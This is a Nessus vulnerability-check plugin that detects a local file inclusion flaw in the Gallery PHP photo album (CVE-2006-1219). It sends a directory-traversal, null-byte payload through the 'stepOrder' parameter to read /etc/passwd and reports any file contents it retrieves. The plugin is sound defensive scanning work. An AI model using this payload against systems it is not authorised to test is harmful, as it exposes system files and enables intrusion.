#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description) {
  script_id(21040);
  script_version("$Revision: 1.10 $");

  script_cve_id("CVE-2006-1219");
  script_bugtraq_id(17051);
  script_xref(name:"OSVDB", value:"23785");

  script_name(english:"Gallery stepOrder Parameter Local File Inclusion");
  script_summary(english:"Tries to read a file using Gallery stepOrder parameter");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP application that is affected by
multiple local file include flaws." );
 script_set_attribute(attribute:"description", value:
"The remote host is running Gallery, a web-based photo album
application written in PHP. 

The version of Gallery installed on the remote host fails to sanitize
input to the 'stepOrder' parameter of the 'upgrade/index.php' and
'install/index.php' scripts before using it in a PHP 'require()'
function.  An unauthenticated attacker may be able to exploit this
issue to view arbitrary files or to execute arbitrary PHP code on the
affect host provided PHP's 'register_globals' setting is enabled." );
 script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?8626cc0e" );
 script_set_attribute(attribute:"see_also", value:"http://gallery.menalto.com/2.0.4_and_2.1_rc_2a_update" );
 script_set_attribute(attribute:"solution", value:
"Disable PHP's 'register_globals' setting, delete the application's
'upgrade/index.php' script, or upgrade to Gallery version 2.0.4 /
2.1-RC-2a or later." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:N/I:P/A:N" );
script_end_attributes();


  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2006-2009 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

port = get_http_port(default:80, embedded: 0);
if (!can_host_php(port:port)) exit(0);


# Loop through various directories.
if (thorough_tests) dirs = list_uniq(make_list("/gallery", cgi_dirs()));
else dirs = make_list(cgi_dirs());

foreach dir (dirs) {
  file = "../../../../../../../../../../../../etc/passwd";
  w = http_send_recv3(method:"GET",
    item:string(
      dir, "/upgrade/index.php?",
      "stepOrder[]=", file, "%00"
    ), 
    port:port
  );
  if (isnull(w)) exit(1, "the web server did not answer");
  res = w[2];

  # There's a problem if...
  if (
    # there's an entry for root or...
    egrep(pattern:"root:.*:0:[01]:", string:res) ||
    # we get an error saying "failed to open stream" or "failed opening".
    #
    # nb: this suggests magic_quotes_gpc was enabled but passing
    #     remote URLs might still work.
    egrep(pattern:"main\(.+/etc/passwd\\0Step\.class.+ failed to open stream", string:res) ||
    egrep(pattern:"Failed opening required '.+/etc/passwd\\0Step\.class'", string:res)
  ) {
    if (egrep(pattern:"root:.*:0:[01]:", string:res))
      contents = res - strstr(res, "<br ");

    if (isnull(contents)) security_warning(port);
    else {
     report = string(
        "\n",
        "Here are the contents of the file '/etc/passwd' that\n",
        "Nessus was able to read from the remote host :\n",
        "\n",
        contents
      );
      security_warning(port:port, extra:report);
    }

    exit(0);
  }
}
